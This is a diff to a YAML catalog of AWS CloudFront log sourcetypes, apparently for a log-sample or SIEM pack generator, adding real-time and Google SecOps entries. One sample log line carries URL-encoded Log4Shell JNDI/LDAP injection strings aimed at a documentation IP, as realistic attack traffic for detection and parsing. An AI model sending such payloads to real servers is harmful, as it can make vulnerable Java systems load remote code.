@@ -28,9 +28,13 @@ sourcetypes:
   - st: aws_cloudfront_accesslog
     desc: Pack Generator sourcetype for CloudFront standard (W3C, tab-separated) access logs
   - st: aws_cloudfront_accesslogs
-    desc: Pack Generator sourcetype for CloudFront access logs (also used for real-time log records)
+    desc: Pack Generator sourcetype for CloudFront standard access logs (the Splunk aws:cloudfront:accesslogs shape)
+  - st: cloudfront:realtime
+    desc: Label for CloudFront real-time logs (Kinesis Data Streams); no standard add-on sourcetype
   - st: aws:cloudfront:accesslogs
     desc: Splunk Add-on for AWS sourcetype for CloudFront standard access logs from S3
+  - st: AWS_CLOUDFRONT
+    desc: Google SecOps (Chronicle) log type
 facts:
   First released: November 2008
   Delivery model: Managed global service (distributions are global; logs are configured per distribution)
@@ -206,7 +210,7 @@ logs:
       - sc_range_end
     sample: "2026-11-12\t02:41:09\tIAD55-P3\t919\t198.51.100.77\tGET\td111111abcdef8.cloudfront.net\t/login\t403\t-\t%24%7Bjndi:ldap://198.51.100.77:1389/a%7D\tuser=%24%7Bjndi:ldap://198.51.100.77:1389/b%7D\t-\tError\tEXAMPLEreqidWAF0123456789abcdefEXAMPLEreqid====\twww.example.com\thttps\t221\t0.001\t-\tTLSv1.3\tTLS_AES_128_GCM_SHA256\tError\tHTTP/1.1\t-\t-\t40122\t0.001\tError\ttext/html\t919\t-\t-"
   - type: Real-time log record
-    sourcetype: aws_cloudfront_accesslogs
+    sourcetype: cloudfront:realtime
     format: tsv
     share: configurable (1–100 % sampling)
     avg: ~300–700 B
